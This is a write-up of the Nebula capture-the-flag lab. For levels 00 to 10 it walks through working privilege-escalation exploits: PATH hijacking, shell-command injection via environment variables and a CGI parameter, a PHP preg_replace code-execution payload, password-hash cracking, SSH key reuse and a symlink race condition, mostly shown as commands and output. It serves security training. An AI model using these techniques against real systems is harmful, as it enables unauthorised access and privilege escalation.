---
title: Nebula
date: 2017-03-15 15:43:28
tags:
---

This is a writeup of the Nebula CTF from [Exploit Exercises](https://exploit-exercises.com/). Although there is already a huge number of solutions I find it still valuable to add more since everyones has another thought process and one might still learn something new in different writeups. Also it is nice to have a reference of problems ones has solved at some point.

Enough talk! Let's jump in...

## Level 00

The levels are accompanied by hints that explain what the level is all about. Here is the first one:

```
This level requires you to find a Set User ID program that will run as the “flag00” account. You could also find this by carefully looking in top level directories in / for suspicious looking directories.

Alternatively, look at the find man page.

To access this level, log in as level00 with the password of level00.
```

This is not much of a challenge since the solution is right there: Search in the man page for the appropriate flags. One could go about it like this:

```bash
level00@nebula:~$ find / -perm -4000 -user flag00 2> /dev/null
/bin/.../flag00
/rofs/bin/.../flag00
```

Note the minus in front of the 4000 that references the `setuid` flag. This is neccessary because we do not know anything about the permissions other than that one flag and the minus allows us to probe just for that. When doing such `find` searches in `/` it is also helpful to redirect `stderr` (`2> /dev/null`) such that there is no `Permission denied` spam.

Now we can claim the flag:

```bash
level00@nebula:~$ cd /rofs/bin/...
level00@nebula:/rofs/bin/...$ ls
flag00
level00@nebula:/rofs/bin/...$ ./flag00 
Congrats, now run getflag to get your flag!
flag00@nebula:/rofs/bin/...$ getflag
You have successfully executed getflag on a target account
```

## Level 01

This time we are given the following source code for a `setuid` binary in `/home/flag01`:

```C
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/usr/bin/env echo and now what?");
}
```

It is useful to know that the man pages contain the documentation of the functions that are used here. This program basically sets the real user id (which is `level01`) to the effective user id (`flag01`, due to the `setuid` bit). That way the command `/usr/bin/env echo and now what?` will be executed as `flag01`. The fact that we can change the environment variables loaded by `/usr/bin/env` allows us to manipulate this command:

```bash
level01@nebula:/home/flag01$ echo "/bin/bash" > /tmp/echo
level01@nebula:/home/flag01$ chmod a+x /tmp/echo 
level01@nebula:/home/flag01$ PATH=/tmp:$PATH ./flag01 
flag01@nebula:/home/flag01$ getflag
You have successfully executed getflag on a target account
```
I created a fake `echo` that just redirects to a shell and added it as the first element to the `$PATH` environment variable. This way the system will find the faked `echo` first, effectively replacing `echo` with `/bin/bash` in the command. Thus, we land in a shell from the `flag01` user due to the `setresgid/setresuid` calls.

## Flag 02

We have to exploit the following code:

```C
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  char *buffer;

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer = NULL;

  asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
  printf("about to call system(\"%s\")\n", buffer);
  
  system(buffer);
}
```

The permission preamble is the same as in the last flag but now we have the possibility to change a buffer that is executed via the `$USER` environment variable. The is also a `printf` that shows us what we are doing.

```
level02@nebula:/home/flag02$ ./flag02 
about to call system("/bin/echo level02 is cool")
level02 is cool
level02@nebula:/home/flag02$ USER="test && /bin/bash &&" ./flag02 
about to call system("/bin/echo test && /bin/bash && is cool")
test
flag02@nebula:/home/flag02$ getflag
You have successfully executed getflag on a target account
```

Setting `$USER` to `test && /bin/bash &&` splits the executed command into three separate commands that are executed subsequently: First the is `/bin/echo test`, which just prints `test`, then we open a shell to get the flag, then `is cool` is executed. This is not a valid command but at this point we don't care anymore as we already have the flag.


## Flag 03

```
Check the home directory of flag03 and take note of the files there.

There is a crontab that is called every couple of minutes.

To do this level, log in as the level03 account with the password level03. Files for this level can be found in /home/flag03.
```

So let's have a look at the directory:

```bash
level03@nebula:/home/flag03$ ls
writable.d  writable.sh
level03@nebula:/home/flag03$ cat writable.sh 
#!/bin/sh

for i in /home/flag03/writable.d/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done

level03@nebula:/home/flag03$ ls writable.d
level03@nebula:/home/flag03$ 
```

So we have a crontab that executes `writable.sh` every couple of minutes, which executes everything in `writable.d` (with a 5s timeout) and removes it afterwards.

One can go about it in a few different ways depending on what one considers getting the flag. My first idea does not give shell access but still executes `getflag` and shows the output:

```bash
level03@nebula:/home/flag03$ echo "getflag | nc 127.0.0.1 3333" > writable.d/test.sh; nc -l 3333
You have successfully executed getflag on a target account
```

In this case, the command exectured by the cronjob is `getflag | nc 127.0.0.1 3333` which executes getflag and sends the output to port 3333 on the same host. Before the cronjob is executed we make sure to start a listener on said port with `nc -l 3333` which receives the target string. In hinsight it would probably be easer to have the cronjob just dump the string in a file with read permissions.

However, in a realistic scenario it would be way better to get complete shell access so we try and aim for that using a similar technique to the previous challenges: We write a little program in C and let the cronjob which runs as `flag03` compile it and set the `setuid` bit:

```
level03@nebula:/home/flag03$ cat << EOF > /tmp/getflag.c
> #include <stdio.h>
> #include <stdlib.h>
> #include <sys/types.h>
> #include <unistd.h>
>
> int main()
> {
>   gid_t gid = getegid();
>   uid_t uid = geteuid();
>   setresgid(gid, gid, gid);
>   setresuid(uid, uid, uid);
>   system("/bin/bash");
> }
> EOF
level03@nebula:/home/flag03$ ls
writable.d  writable.sh
level03@nebula:/home/flag03$ echo "gcc /tmp/getflag.c -o /home/flag03/getflag; chmod +s /home/flag03/getflag" > writable.d/getflag.sh
level03@nebula:/home/flag03$ ./getflag
flag03@nebula:/home/flag03$ getflag
You have successfully executed getflag on a target account
```

I do want to mention an issue I had while working out the solution so that I'm not the only one that learned from it: First I instructed the compiler to place the executable in the `/tmp` folder so that I don't pollute `/home`. The problem is that the `suid` bit did not seem to work unless I build the executable in the `/home` directory. So I searched for reasons why `suid` may be directory dependent and found the `nosuid` mount flag. One can easily check if that is the reason in this case:

```bash
flag03@nebula:/home/flag03$ cat /etc/fstab
overlayfs / overlayfs rw 0 0
tmpfs /tmp tmpfs nosuid,nodev 0 0
```

Indeed the `/tmp` folder is mounted as a `tmpfs` in RAM with the `nosuid` flag set such that `suid` has no effect there.


## Level 04:

The source code of `flag04` reads and prints a file after it makes sure that the filename does not contain "token" which is probably exactly the file we need to open. For those that are not that familiar with C code, the last write has a 1 as file descriptor argument which references the file descriptor of `stdout`, thus the write is basically a print.

```C
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>

int main(int argc, char **argv, char **envp)
{
  char buf[1024];
  int fd, rc;

  if(argc == 1) {
      printf("%s [file to read]\n", argv[0]);
      exit(EXIT_FAILURE);
  }

  if(strstr(argv[1], "token") != NULL) {
      printf("You may not access '%s'\n", argv[1]);
      exit(EXIT_FAILURE);
  }

  fd = open(argv[1], O_RDONLY);
  if(fd == -1) {
      err(EXIT_FAILURE, "Unable to open %s", argv[1]);
  }

  rc = read(fd, buf, sizeof(buf));

  if(rc == -1) {
      err(EXIT_FAILURE, "Unable to read fd %d", fd);
  }

  write(1, buf, rc);
}
```

This smells like a problem that is solvable by symlink:

```bash
level04@nebula:/home/flag04$ cat token
cat: token: Permission denied
level04@nebula:/home/flag04$ ./flag04 token
You may not access 'token'
level04@nebula:/home/flag04$ ln -s /home/flag04/token /tmp/link
level04@nebula:/home/flag04$ ./flag04 /tmp/link
06508b5e-8909-4f38-b630-fdb148a848a2
level04@nebula:/home/flag04$ su flag04
Password:
sh-4.2$ getflag
You have successfully executed getflag on a target account
```

This was really straight forward once the C code is understood.

## Level 05:

This time there is no source code, but the hint points at insecure directory permissions:

```
level05@nebula:/home/flag05$ ls -la
total 5
drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 .
drwxr-xr-x 1 root   root     160 2012-08-27 07:18 ..
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .backup
-rw-r--r-- 1 flag05 flag05   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag05 flag05  3353 2011-05-18 02:54 .bashrc
-rw-r--r-- 1 flag05 flag05   675 2011-05-18 02:54 .profile
drwx------ 2 flag05 flag05    70 2011-11-20 20:13 .ssh
level05@nebula:/home/flag05$ cd .backup/
level05@nebula:/home/flag05/.backup$ ls
backup-19072011.tgz
level05@nebula:/home/flag05/.backup$ mkdir /tmp/backup
level05@nebula:/home/flag05/.backup$ tar -xzf backup-19072011.tgz -C /tmp/backup/
level05@nebula:/home/flag05/.backup$ cd /tmp/backup/
level05@nebula:/tmp/backup$ ls
level05@nebula:/tmp/backup$ ls -la
total 0
drwxrwxr-x 3 level05 level05  60 2018-06-25 06:20 .
drwxrwxrwt 5 root    root    160 2018-06-25 06:20 ..
drwxr-xr-x 2 level05 level05 100 2011-07-19 02:37 .ssh
level05@nebula:/tmp/backup$ cd .ssh/
level05@nebula:/tmp/backup/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub
level05@nebula:/tmp/backup/.ssh$ ssh -i ./id_rsa flag05@localhost
[...]
flag05@nebula:~$ getflag
You have successfully executed getflag on a target account
```

We find a hidden `.backup` folder with a compressed backup of the `.ssh` folder inside containing an SSH keys. We can use it to log in to `flag05` via SSH and we have the flag.

## Level 06:

This time we only know that the `flag06` account came from a legacy unix system. My first guess is that probably means that the `/etc/passwd` file could contain the password hash. Nowadays the password would reside encrypted in the `/etc/shadow` file which we can't even read. Let's have a look:

```
level06@nebula:/home/flag06$ cat /etc/passwd | grep flag06
flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
```

Indeed, we can see a password hash in the field where modern accounts would only show an `x`. I don't have a better solution than to crack it, which will probably be easy as the hash function is probably very dated. To achieve this I use `scp` to upload john the ripper to the Nebula VM.

```
~/Downloads scp john-1.8.0.tar.xz level06@192.168.56.101:~
[...]
~/Downloads ssh level06@192.168.56.101
[...]
level06@nebula:~$ ls
john-1.8.0.tar.xz
level06@nebula:~$ ls
john-1.8.0  john-1.8.0.tar.xz
level06@nebula:~$ cd john-1.8.0/
level06@nebula:~/john-1.8.0$ ls
doc  README  run  src
level06@nebula:~/john-1.8.0$ cd src/
level06@nebula:~/john-1.8.0/src$ uname -a
Linux nebula 3.0.0-12-generic #20-Ubuntu SMP Fri Oct 7 14:50:42 UTC 2011 i686 i686 i386 GNU/Linux
level06@nebula:~/john-1.8.0/src$ make linux-x86-sse2
[...]
level06@nebula:~/john-1.8.0/src$ cd ../run/
level06@nebula:~/john-1.8.0/run$ ls
ascii.chr  digits.chr  john  john.conf  lm_ascii.chr  mailer  makechr  password.lst  relbench  unafs  unique  unshadow
level06@nebula:~/john-1.8.0/run$ ./john /etc/passwd
Loaded 1 password hash (descrypt, traditional crypt(3) [DES 128/128 SSE2])
Press 'q' or Ctrl-C to abort, almost any other key for status
hello            (flag06)
1g 0:00:00:00 100% 2/3 100.0g/s 75300p/s 75300c/s 75300C/s 123456..marley
Use the "--show" option to display all of the cracked passwords reliably
Session completed
level06@nebula:~/john-1.8.0/run$ su flag06
Password:
sh-4.2$ getflag
You have successfully executed getflag on a target account
```

Even the compilation took longer than the actual cracking, which reveals a trivial password.

# Level 07:

This flag revolves around the following Perl CGI script:

```perl
#!/usr/bin/perl

use CGI qw{param};

print "Content-type: text/html\n\n";

sub ping {
  $host = $_[0];

  print("<html><head><title>Ping results</title></head><body><pre>");

  @output = `ping -c 3 $host 2>&1`;
  foreach $line (@output) { print "$line"; }

  print("</pre></body></html>");

}

# check if Host set. if not, display normal page, etc

ping(param("Host"));
```

This will probably require us to inject a command via the `$host` variable, as the script does not do any input validation. There is also a `thttpd.conf` file which contains the port where the script is accessible

```
index.cgi  thttpd.conf
level07@nebula:/home/flag07$ cat thttpd.conf
# /etc/thttpd/thttpd.conf: thttpd configuration file

# This file is for thttpd processes created by /etc/init.d/thttpd.
# Commentary is based closely on the thttpd(8) 2.25b manpage, by Jef Poskanzer.

# Specifies an alternate port number to listen on.
port=7007
[...]
```

We can play around without the right permissions from the command line. The `Host` variable is our entry point for command injection:

```bash
level07@nebula:/home/flag07$ ./index.cgi Host=127.0.0.1
Content-type: text/html

<html><head><title>Ping results</title></head><body><pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_req=1 ttl=64 time=0.011 ms
64 bytes from 127.0.0.1: icmp_req=2 ttl=64 time=0.044 ms
64 bytes from 127.0.0.1: icmp_req=3 ttl=64 time=0.024 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 1998ms
rtt min/avg/max/mdev = 0.011/0.026/0.044/0.014 ms
</pre></body></html>level07@nebula:/home/flag07$ ./index.cgi Host=127.0.0.1;getflag
Content-type: text/html

<html><head><title>Ping results</title></head><body><pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_req=1 ttl=64 time=0.014 ms
64 bytes from 127.0.0.1: icmp_req=2 ttl=64 time=0.028 ms
64 bytes from 127.0.0.1: icmp_req=3 ttl=64 time=0.051 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 1998ms
rtt min/avg/max/mdev = 0.014/0.031/0.051/0.015 ms
</pre></body></html>getflag is executing on a non-flag account, this doesn't count
```

We can inject the getflag command by adding another command to the ping statement via ";". To get the actual flag the cgi script has to be executed by `flag07`, which happens if it is called via the thttpd server listening on port 7007. To get the `;` to work in the Browser we have to encode it first, such that it is suitable for an URL. A quick search for an encoder reveals that the correct symbol is `%3B`, so we enter the URL into Firefox:

```bash
Firefox URL bar: http://10.0.2.14:7007/index.cgi?Host=127.0.0.1%3Bgetflag

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_req=1 ttl=64 time=0.011 ms
64 bytes from 127.0.0.1: icmp_req=2 ttl=64 time=0.025 ms
64 bytes from 127.0.0.1: icmp_req=3 ttl=64 time=0.024 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 1999ms
rtt min/avg/max/mdev = 0.011/0.020/0.025/0.006 ms
You have successfully executed getflag on a target account
```

As the output is just plain text I did not bother with a screenshot, but I think it's clear what I did there. As in level 03 we could also inject a command that compiles a `setuid` binary to gain a shell.

## Level 08

This time we encounter a package capture file:

```bash
level08@nebula:/home/flag08$ ls -la
total 14
drwxr-x--- 2 flag08 level08   86 2012-08-19 03:07 .
drwxr-xr-x 1 root   root     100 2012-08-27 07:18 ..
-rw-r--r-- 1 flag08 flag08   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag08 flag08  3353 2011-05-18 02:54 .bashrc
-rw-r--r-- 1 root   root    8302 2011-11-20 21:22 capture.pcap
-rw-r--r-- 1 flag08 flag08   675 2011-05-18 02:54 .profile
level08@nebula:/home/flag08$ exit
root@kali:~# scp level08@10.0.2.14:~flag08/capture.pcap .
```

We can download it and open it in Wireshark to see if it contains any captured plaintext password transmissions. Wireshark makes this very easy with the `Follow > TCP Stream` function:

{% asset_img "wireshark.png" "Wireshark Follow TCP Stream" %}

The login name `l.le.ev.ve.el.l8.8` suggest that the keypresses are all transmitted, including backspaces which seem to be represented by dots. This means that the password is not `backdoor...00Rm8.ate` but rather `backd00Rmate`.

```bash
level08@nebula:~$ su flag08
Password: 
sh-4.2$ getflag
You have successfully executed getflag on a target account
```

## Level 09

To solve level 09 `preg_replace` in the following PHP script has to be exploited:

```PHP
<?php

function spam($email)
{
  $email = preg_replace("/\./", " dot ", $email);
  $email = preg_replace("/@/", " AT ", $email);
  
  return $email;
}

function markup($filename, $use_me)
{
  $contents = file_get_contents($filename);

  $contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);
  $contents = preg_replace("/\[/", "<", $contents);
  $contents = preg_replace("/\]/", ">", $contents);

  return $contents;
}

$output = markup($argv[1], $argv[2]);

print $output;

?>
```

The first thing I notice is the excessive use of `preg_replace` which in turn makes me think that this is the part that should be exploited. As I am not overly familiar with PHP it is always a good idea to look at the documentation. If is often the case that in older programming languages there are functions that are deprecated due to gaping security holes but still kept for compatibility. These are exactly the functions that often appear in CTFs and the security holes are generally well documented.

Before we check, let's first analyze what the code does: It prints the output of the `markup` call with two command line arguments as arguments, only one of which is used by `markup`. `markup` itself reads the file with the name of the first argument, if the content contains something like `[email mail@example.com]` it extracts the address and expands `@` to ` AT ` and `.` to ` dot ` via `spam` and strips off `[` and `]`:

```bash
level09@nebula:/home/flag09$ echo [email mail@example.com] > /tmp/exploit
level09@nebula:/home/flag09$ ./flag09 /tmp/exploit 
PHP Notice:  Undefined offset: 2 in /home/flag09/flag09.php on line 22
mail AT example dot com
```

A look at the documentation reveals that there is indeed a vulnerability in `preg_replace` with the `/e` flag which has been deprecated in later PHP versions. The second match group, which is the email address itself, is passed to spam, or is rather injected into spam call in a string, which is the evaluated. From a modern programming standpoint this already sound ridiculous. It's not that hard to find information about how to exploit it: If we wrap the desired command like `{${command}}` (for more information search for 'php complex curly syntax') it is inserted into the second string such that the command is executed before it's output is passed to `spam`:

```bash
level09@nebula:/home/flag09$ echo '[email {${system(sh)}}]' > /tmp/exploit 
level09@nebula:/home/flag09$ ./flag09 /tmp/exploit 
PHP Notice:  Undefined offset: 2 in /home/flag09/flag09.php on line 22
PHP Notice:  Use of undefined constant sh - assumed 'sh' in /home/flag09/flag09.php(15) : regexp code on line 1
sh-4.2$ whoami
flag09
sh-4.2$ getflag
You have successfully executed getflag on a target account
```

## Level 10

We have yet another `setuid` binary with the following source code:

```C

#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>

int main(int argc, char **argv)
{
  char *file;
  char *host;

  if(argc < 3) {
      printf("%s file host\n\tsends file to host if you have access to it\n", argv[0]);
      exit(1);
  }

  file = argv[1];
  host = argv[2];

  if(access(argv[1], R_OK) == 0) {
      int fd;
      int ffd;
      int rc;
      struct sockaddr_in sin;
      char buffer[4096];

      printf("Connecting to %s:18211 .. ", host); fflush(stdout);

      fd = socket(AF_INET, SOCK_STREAM, 0);

      memset(&sin, 0, sizeof(struct sockaddr_in));
      sin.sin_family = AF_INET;
      sin.sin_addr.s_addr = inet_addr(host);
      sin.sin_port = htons(18211);

      if(connect(fd, (void *)&sin, sizeof(struct sockaddr_in)) == -1) {
          printf("Unable to connect to host %s\n", host);
          exit(EXIT_FAILURE);
      }

#define HITHERE ".oO Oo.\n"
      if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
          printf("Unable to write banner to host %s\n", host);
          exit(EXIT_FAILURE);
      }
#undef HITHERE

      printf("Connected!\nSending file .. "); fflush(stdout);

      ffd = open(file, O_RDONLY);
      if(ffd == -1) {
          printf("Damn. Unable to open file\n");
          exit(EXIT_FAILURE);
      }

      rc = read(ffd, buffer, sizeof(buffer));
      if(rc == -1) {
          printf("Unable to read from file: %s\n", strerror(errno));
          exit(EXIT_FAILURE);
      }

      write(fd, buffer, rc);

      printf("wrote file!\n");

  } else {
      printf("You don't have access to %s\n", file);
  }
}

```

The program sends the contents of a file via network. The problem is that the file is only opened if the real user id has access to it, which we do not have for the `token` file that is the obvious target. The actual file reading is done with `flag10` permissions. If one has experience with such code one can see that this is actually a race condition. What if the the check happens on an accessible file that is replaced by an inaccessible file (for `level10`) before it is actually read? We have our attack vector! But the file name is a constant argument, how can we change it during execution? The answer is we can't but we can use symlinks such that the filename points to different files:

```bash
level10@nebula:/home/flag10$ echo "dummy" > /tmp/dummy
level10@nebula:/home/flag10$ while true; do ln -sf ~flag10/token /tmp/switch; ln -sf /tmp/dummy /tmp/switch; done
```

As in most race conditions we will not be able to reliably trigger it, which is why we will try it multiple times:

```bash
for x in {1..100}; do ./flag10 /tmp/switch 127.0.0.1; done
```

We also have to set up our listener on port `18211` as it is hard coded in the source code. Due to our numerous tries, the listener should keep listening after connection loss. `nc` has the `-k` flag for this purpose:

```bash
level10@nebula:~$ nc -lk 18211

.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
.oO Oo.
dummy
.oO Oo.
dummy
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
[...]
level10@nebula:/home/flag10$ su flag10
Password: 
sh-4.2$ getflag
You have successfully executed getflag on a target account
```
